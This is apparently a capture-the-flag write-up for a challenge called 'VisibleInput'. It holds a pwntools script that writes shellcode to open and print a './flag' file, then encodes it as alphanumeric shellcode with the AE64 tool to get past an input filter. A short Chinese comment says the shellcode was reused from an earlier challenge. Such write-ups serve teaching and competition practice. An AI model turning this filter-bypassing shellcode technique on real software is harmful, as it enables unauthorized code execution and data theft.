# VisibleInput

```py
from pwn import *
from ae64 import AE64 # https://github.com/veritas501/ae64
context.arch="amd64"
p=process("./pwn")
shellcode = shellcraft.read(3, 0x20240100, 0x40)
shellcode += shellcraft.write(1, 0x20240100, 0x40)
shellcode=b"\x90\x90\x48\xB8\x2E\x2F\x66\x6C\x61\x67\x00\x00\x50\x48\x89\xE7\x31\xD2\x31\xF6\x6A\x02\x58\x0F\x05"+asm(shellcode)
p.send(AE64().encode(shellcode, 'rdx', 0, 'fast'))
p.interactive()
```
直接抄了shellcode_revenge的shellcode然后找个工具将其加工成alphanumeric shellcode。要是没有工具这题肯定不止150